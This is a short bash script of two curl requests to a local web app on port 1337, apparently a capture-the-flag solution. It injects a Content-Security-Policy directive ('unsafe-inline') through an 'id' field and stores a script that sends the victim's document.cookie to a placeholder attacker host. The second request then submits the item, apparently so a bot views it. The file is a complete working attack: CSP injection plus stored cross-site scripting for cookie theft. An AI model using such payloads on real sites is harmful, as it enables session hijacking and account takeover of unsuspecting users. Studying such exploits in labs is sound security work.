#! /bin/bash

curl -X 'POST' -H 'Content-Type: application/json' --data-raw $'{\"id\":\"b; script-src-elem \'unsafe-inline\'\",\"subject\":\"abc\",\"content\":\"<script>fetch(\'http://ipaddress:1234/?\'+document.cookie)</script>\"}' http://localhost:1337/open-commission
curl -X 'POST' -H 'Content-Type: application/json' --data-raw $'{\"id\":\"b; script-src-elem \'unsafe-inline\'\"}' http://localhost:1337/submit-commission